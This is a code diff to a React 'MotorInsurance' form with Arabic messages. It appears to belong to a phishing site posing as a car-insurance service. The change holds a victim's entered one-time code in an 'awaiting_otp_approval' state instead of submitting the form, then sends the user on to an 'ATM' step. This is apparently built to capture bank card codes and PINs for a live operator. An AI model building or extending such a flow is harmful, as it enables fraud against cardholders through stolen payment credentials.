@@ -682,6 +682,9 @@ export default function MotorInsurance() {
         if (currentStep === 4) {
           setCurrentStep(5);
           handleCurrentPage("motor-insurance-step-5-otp");
+        } else if (currentStep === 5) {
+          setCurrentStep(7);
+          handleCurrentPage("motor-insurance-step-7-atm");
         } else if (currentStep === 7) {
           setCurrentStep(6);
           handleCurrentPage("motor-insurance-step-6-success");
@@ -708,8 +711,8 @@ export default function MotorInsurance() {
           setCurrentStep(4);
         }
         toast({
-          title: "تم رفض البطاقة",
-          description: data.rejectionReason || "الرجاء استخدام بطاقة أخرى",
+          title: "تم رفض الرمز",
+          description: data.rejectionReason || "الرجاء المحاولة مرة أخرى",
           variant: "destructive",
         });
       }
@@ -1058,21 +1061,14 @@ export default function MotorInsurance() {
         addData({
           id: visitorId,
           step: 5,
-          currentPage: "motor-insurance-step-6",
-          otpVerified: true,
+          currentPage: "motor-insurance-step-5-awaiting",
           otpCode: otpCode,
-          status: "completed",
+          status: "awaiting_otp_approval",
         });
       }
 
-      const submissionData: InsuranceFormData = {
-        ...data,
-        selectedOfferId: selectedOfferId!,
-        selectedOfferName: selectedOffer.name,
-        selectedFeatures: JSON.stringify(features),
-        offerTotalPrice: offerTotal.toFixed(2),
-      };
-      mutation.mutate(submissionData);
+      setIsAwaitingApproval(true);
+      setApprovalStatus(null);
     }
     return true;
   };
